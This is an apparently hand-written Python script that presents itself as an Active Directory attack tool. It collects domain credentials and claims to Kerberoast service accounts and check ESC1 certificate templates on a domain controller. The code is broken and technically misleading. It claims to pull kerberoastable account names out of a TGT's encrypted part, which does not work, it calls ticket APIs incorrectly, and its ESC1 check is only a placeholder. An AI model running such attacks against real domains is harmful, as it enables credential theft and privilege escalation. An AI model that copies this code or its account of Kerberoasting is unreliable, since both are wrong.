from impacket.krb5.asn1 import AP_REQ, Authenticator
from impacket.krb5 import constants
from impacket.krb5.ccache import CCache
from impacket.krb5.types import Principal
from impacket.smbconnection import SMBConnection
import ldap3

def kerberos_auth(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controller via SMB
        smb = SMBConnection(dc_ip, dc_ip)
        smb.login(username, password, domain)

        # Initialize the client CCache
        ccache = CCache()

        # Get TGT from KDC
        krbtgt = ccache.new_creds(username, password, domain)

        smb.logoff()

        return ccache, krbtgt

    except Exception as e:
        print(f"Error during Kerberos authentication: {e}")
        return None, None

def ldap_auth(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controller
        server = ldap3.Server(dc_ip)

        # Bind with LDAP credentials
        conn = ldap3.Connection(server, user=f"{domain}\\{username}", password=password, authentication=ldap3.NTLM)

        # Perform the bind operation
        if not conn.bind():
            print("LDAP authentication failed.")
            return None
        else:
            print("LDAP authentication successful.")
            return conn

    except Exception as e:
        print(f"Error during LDAP authentication: {e}")
        return None

def kerberoast(domain, username, password, dc_ip):
    try:
        print(f"Attempting to Kerberoast accounts from {dc_ip}")

        # Get TGT ticket for the specified user
        _, krbtgt_ticket = kerberos_auth(username, password, domain, dc_ip)

        if krbtgt_ticket:
            print("Successfully obtained krbtgt ticket.")
            
            # Extract usernames of kerberoastable accounts from the TGT
            kerberoastable_accounts = extract_kerberoastable_accounts(krbtgt_ticket)
            if kerberoastable_accounts:
                print("Kerberoastable Accounts:")
                for account in kerberoastable_accounts:
                    print(account)
            else:
                print("No kerberoastable accounts found.")
        else:
            print("Failed to obtain krbtgt ticket.")

    except Exception as e:
        print(f"Error while Kerberoasting: {e}")

def extract_kerberoastable_accounts(tgt):
    try:
        kerberoastable_accounts = []

        for ticket in tgt['enc-part']['cipher'].tickets:
            sname = str(ticket['sname'])
            if sname.startswith('service'):
                service_name = sname.split('/')[1].split('@')[0]
                kerberoastable_accounts.append(service_name)

        return kerberoastable_accounts

    except Exception as e:
        print(f"Error while extracting kerberoastable accounts: {e}")
        return []

def check_esc1_certificate_templates(domain, username, password, dc_ip):
    try:
        print(f"Attempting to check ESC1 certificate templates on {dc_ip}")

        # Connect to the Domain Controller via LDAP
        conn = ldap_auth(username, password, domain, dc_ip)

        if conn:
            print("Successfully authenticated via LDAP.")
            
            # Placeholder for ESC1 certificate template check
            print("ESC1 Certificate template check will be implemented here.")
        else:
            print("Failed to authenticate via LDAP.")

    except Exception as e:
        print(f"Error while checking ESC1 certificate templates: {e}")


# Example usage:
username = input("Enter username: ")
password = input("Enter password: ")
domain = input("Enter domain: ")
dc_ip = input("Enter domain controller IP or hostname: ")

kerberoast(domain, username, password, dc_ip)
check_esc1_certificate_templates(domain, username, password, dc_ip)